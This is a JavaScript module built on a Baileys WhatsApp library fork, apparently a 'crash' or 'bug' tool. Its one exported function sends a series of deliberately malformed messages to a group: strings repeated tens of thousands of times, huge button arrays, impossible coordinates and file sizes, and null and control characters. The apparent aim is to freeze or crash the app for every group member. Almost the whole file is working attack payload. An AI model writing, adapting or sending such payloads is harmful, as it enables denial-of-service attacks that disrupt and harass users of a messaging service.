const { default: makeWASocket, useMultiFileAuthState, Browsers, delay, proto, DisconnectReason, makeCacheableSignalKeyStore, generateWAMessageFromContent, getUSyncDevices, jidDecode, encodeWAMessage, encodeSignedDeviceIdentity } = require('@sakataoffc/baileys');
const pino = require('pino');
const crypto = require('crypto');

async function Xgc(sock, groupJid) {
    const LexzyExe = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "LexzyMods - Executed¿!"
                    },
                    nativeFlowMessage: {
                        buttons: "{}".repeat(75000),
                    },
                },
            },
        },
    };

    const Lexx = generateWAMessageFromContent(groupJid, LexzyExe, {});

    await sock.relayMessage(groupJid, Lexx.message, {
        participant: target,
        messageId: Lexx.key.id
    });

    await sock.relayMessage(groupJid, {
        stickerPackMessage: {
            stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
            name: "ꦾ".repeat(75000),
            publisher: "iniochamy - Executed¿!" + "ꦾ".repeat(5000),
            stickers: [],
            fileLength: "366299919",
            fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
            fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
            mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
            directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
            contextInfo: {
                remoteJid: "X",
                participant: "0@s.whatsapp.net",
                stanzaId: "1234567890ABCDEF",
                mentionedJid: ["13135555555@s.whatsapp.net"]
            },
            packDescription: "",
            mediaKeyTimestamp: "1747502082",
            trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
            thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
            thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
            thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
            thumbnailHeight: 999999999,
            thumbnailWidth: 9999999999,
            imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
            stickerPackSize: "9990099",
            stickerPackOrigin: "USER_CREATED"
        }
    }, {});

    await sock.relayMessage(
        groupJid,
        {
            ephemeralMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            title: "Students Func Nanas",
                            locationMessage: {
                                degreesLatitude: -999.03499999999999,
                                degreesLongitude: 922.9999999999999,
                                name: "LexzyMods",
                                address: "X",
                                jpegThumbnail: null,
                            },
                            hasMediaAttachment: true,
                        },
                        body: {
                            text: "LexzyMods - Executed¿!",
                        },
                        nativeFlowMessage: {
                            buttons: [
                                {
                                    name: "single_select",
                                    buttonParamsJson: "ြ ".repeat(9000),
                                },
                                {
                                    name: "address_message",
                                    buttonParamsJson: "ြ ".repeat(9000),
                                },
                                {
                                    name: "galaxy_message",
                                    buttonParamsJson: "ြ ".repeat(75000),
                                },
                            ],
                            messageParamsJson: "wa.me/stickerpack/LexzyMods",
                            messageVersion: 1,
                        },
                    },
                },
            },
        },
        {}
    );

    await sock.relayMessage(groupJid, {
        groupStatusMessageV2: {
            message: {
                videoMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/609348532_2813167542392969_465741537439148405_n.enc?ccb=11-4&oh=01_Q5Aa4AGN8v9HYNPCRbPeMILfoQ7MIqSvhY-gd7wr6YvDHhHSwA&oe=69EB192E&_nc_sid=5e03e0&mms3=true",
                    mimetype: "video/mp4",
                    caption: "LexzyMods - Executed¿!",
                    fileSha256: "LdNOQNcNIvlIijHvkpwRIY/zIoTfWQoFux7dzTHusyM=",
                    fileLength: "1099511627776",
                    seconds: 172800,
                    mediaKey: "G2MGbP7BZLi1RwpyyV4DeXtfttaclMVSKfqNldZDt20=",
                    height: 1080,
                    width: 1920,
                    fileEncSha256: "U4uKZrZeJpg8smAcMRT3qtPoviAp/dqGa63GzqYcS8E=",
                    directPath: "/v/t62.7161-24/609348532_2813167542392969_465741537439148405_n.enc?ccb=11-4&oh=01_Q5Aa4AGN8v9HYNPCRbPeMILfoQ7MIqSvhY-gd7wr6YvDHhHSwA&oe=69EB192E&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1774428565",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAKAMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAgMEBQYBAQEBAQEAAAAAAAAAAAAAAAAAAgMB/9oADAMBAAIQAxAAAADzL0VRwnekefd8ThLRzuO2/JxNWKr5ZFS+12VFgitnN6HKX8UQ1y6bCz0xiswAP//EACQQAAICAQQBBAMAAAAAAAAAAAECAAMREhMhMVIEQQIgQVFT/9oACAEBAAE/APi9NXgJtVeAgqq8BNmrwE2qvASx8YAGSY6XhM6ADK67rG0k6Zz0ex7EoHrL9ZltulMoMyi8sgY4jNhmycnMFgnqC5AYdAytToLseCJUFstFYfiKoFtidkGFZfWNpgIrl61B4HUrC1EkMfowNm4n8kQmEZioEezJ6ms9Z4jMAARAwZQRN+n+gl/qFNrFeobQScCaz+5Xdob6+X//xAAbEQACAgMBAAAAAAAAAAAAAAABESACECAhQf/aAAgBAgEBPwB6PFEYa+4pwwkLX//EABsRAAICAwEAAAAAAAAAAAAAAAECABEDICEQ/9oACAEDAQE/ANskB8fqxVNgxlF80//Z",
                    annotations: [
                        {
                            polygonVertices: [
                                {
                                    x: 0.17499999701976776,
                                    y: 0.3379453122615814
                                },
                                {
                                    x: 0.824999988079071,
                                    y: 0.3379453122615814
                                },
                                {
                                    x: 0.824999988079071,
                                    y: 0.6620468497276306
                                },
                                {
                                    x: 0.17499999701976776,
                                    y: 0.6620468497276306
                                }
                            ],
                            shouldSkipConfirmation: true,
                            embeddedContent: {
                                embeddedMusic: {
                                    musicContentMediaId: "2261401457948346",
                                    songId: "849859527815275",
                                    author: "Lexcaabos - Executed¿!" + "ြ".repeat(9000),
                                    title: "ြ".repeat(75000),
                                    artworkDirectPath: "/v/t62.76458-24/568311115_4528169627440664_4559757974106869948_n.enc?ccb=11-4&oh=01_Q5Aa5AGs28VMFVXkcn0w9n-YUhiBwEPKyIwEcjWZLHm7mUgOsQ&oe=6A786B6E&_nc_sid=5e03e0",
                                    artworkSha256: "FROyKnRoHfLzDwmz5tED8K3nmdK+4Uihn2ucHBZDjPI=",
                                    artworkEncSha256: "y/SkheY3BoGhndQlmR6icfLtMtI4FjjRi5y3bsX13jw=",
                                    artworkMediaKey: "s5VCH/gb/YjDXhek47MVcsHjVV3/lOHOYaDe72eodXw=",
                                    artistAttribution: "https://www.instagram.com/_u/lexzymods",
                                    countryBlocklist: "WEs=",
                                    isExplicit: false
                                }
                            },
                            embeddedAction: true
                        }
                    ]
                }
            }
        }
    }, {});

    const bot = "867051314767696@bot";

    await sock.relayMessage(groupJid, {
        botForwardedMessage: {
            message: {
                richResponseMessage: {
                    messageType: 1,

                    submessages: [
                        {
                            messageType: 2,
                            messageText: `@${bot.split("@")[0]}`
                        },

                        {
                            messageType: 5,
                            codeMetadata: {
                                codeLanguage: "javascript",

                                codeBlocks: [
                                    {
                                        highlightType: 1,
                                        codeContent: "const = {"
                                    },
                                    {
                                        highlightType: 2,
                                        codeContent: "Lexcaabos - Executed¿!"
                                    },
                                    {
                                        highlightType: 3,
                                        codeContent: `${"\0".repeat(75000)}` + `${"\x10".repeat(25000)}`
                                    }
                                ]
                            }
                        }
                    ],

                    contextInfo: {
                        mentionedJid: [bot],

                        featureEligibilities: Array.from(
                            { length: 1999 },
                            () => ({
                                canReceiveMultiReact: true
                            })
                        ),

                        isForwarded: true,

                        forwardedAiBotMessageInfo: {
                            botJid: bot
                        },

                        forwardOrigin: 4
                    }
                }
            }
        }
    }, {});

    const Iniochamy = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    header: {
                        imageMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                            mimetype: "image/jpeg",
                            fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
                            fileLength: 9999,
                            height: 9999,
                            width: 9999,
                            mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
                            fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
                            directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1776937541",
                            jpegThumbnail: null,
                            caption: "LexzyMods - Executed¿!",
                            scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
                            scanLengths: [
                                9999987899999999999999,
                                998999999999999999999,
                                999899999999999999999,
                                9998789999999999999999
                            ],
                            midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
                        }
                    },
                    body: {
                        text: "Lexcaabos - Executed¿!",
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 450000 }, () => ({}))
                    }
                }
            }
        }
    };

    const Iniochamyy = generateWAMessageFromContent(groupJid, Iniochamy, {});

    await sock.relayMessage(groupJid, Iniochamyy.message, {
        participant: target,
        messageId: Iniochamyy.key.id
    });
}

module.exports = { Xgc };
